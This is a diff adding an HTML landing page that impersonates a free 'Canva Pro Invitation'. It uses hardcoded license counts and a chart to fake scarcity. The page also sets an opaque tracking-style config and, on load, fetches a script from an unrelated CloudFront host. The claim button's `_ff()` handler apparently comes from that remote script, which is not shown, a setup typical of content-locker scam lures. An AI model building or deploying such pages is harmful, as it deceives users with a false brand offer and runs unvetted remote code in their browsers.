@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Canva Pro Invitation</title>
+  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(to bottom, #f0f4ff, #dfe9ff);
+      color: #1a1a1a;
+      padding: 20px;
+      text-align: center;
+    }
+    header {
+      padding: 40px 20px 20px;
+    }
+    header h1 {
+      font-size: 2.5rem;
+      color: #0033cc;
+      margin-bottom: 10px;
+    }
+    header p {
+      font-size: 1.2rem;
+      color: #555;
+    }
+    .hook-image {
+      width: 100%;
+      max-width: 600px;
+      margin: 20px auto;
+      display: block;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    .stats {
+      margin: 40px 0 20px;
+      font-size: 1.5rem;
+      font-weight: bold;
+    }
+    .cta {
+      display: flex;
+      justify-content: center;
+      margin: 40px 0;
+    }
+    .cta-button {
+      font-size: 1.2rem;
+      padding: 16px 32px;
+      border: none;
+      border-radius: 8px;
+      background-color: #0066ff;
+      color: white;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+    .cta-button:hover {
+      background-color: #004fcc;
+      transform: scale(1.05);
+    }
+    @media (max-width: 600px) {
+      header h1 {
+        font-size: 1.8rem;
+      }
+      .cta-button {
+        width: 100%;
+        font-size: 1rem;
+      }
+    }
+    canvas {
+      max-width: 500px;
+      margin: 0 auto;
+    }
+  </style>
+  <script type="text/javascript">
+    var eFpAZ_COX_Xxqnvc={"it":4453457,"key":"f68b7"};
+  </script>
+  <script src="https://d2yc6hxtq0phup.cloudfront.net/61a7095.js"></script>
+</head>
+<body>
+  <header>
+    <h1>Canva Pro Invitation is Available for You!</h1>
+    <p>Get your premium access today before all licenses run out. Limited availability!</p>
+  </header>
+
+  <img src="https://bitscloud.com/wp-content/uploads/2023/12/what-is-canva.webp" alt="Canva Pro Access" class="hook-image" />
+
+  <div class="stats">
+    <div id="usedCount"></div>
+    <div id="availableCount"></div>
+  </div>
+
+  <canvas id="licenseChart"></canvas>
+
+  <div class="cta">
+    <button class="cta-button" onclick="_ff()">Claim Your Canva Pro Access</button>
+  </div>
+
+  <script>
+    const totalLicenses = 500;
+    const usedLicenses = 47;
+    const availableLicenses = 453;
+
+    document.getElementById('usedCount').textContent = `Used Licenses: ${usedLicenses}`;
+    document.getElementById('availableCount').textContent = `Available Licenses: ${availableLicenses}`;
+
+    const ctx = document.getElementById('licenseChart').getContext('2d');
+    new Chart(ctx, {
+      type: 'doughnut',
+      data: {
+        labels: ['Used', 'Available'],
+        datasets: [{
+          data: [usedLicenses, availableLicenses],
+          backgroundColor: ['#ff6b6b', '#6bff6b'],
+          borderColor: ['#fff', '#fff'],
+          borderWidth: 2
+        }]
+      },
+      options: {
+        responsive: true,
+        plugins: {
+          legend: {
+            position: 'bottom',
+            labels: {
+              font: {
+                size: 14
+              }
+            }
+          }
+        }
+      }
+    });
+  </script>
+</body>
+</html>
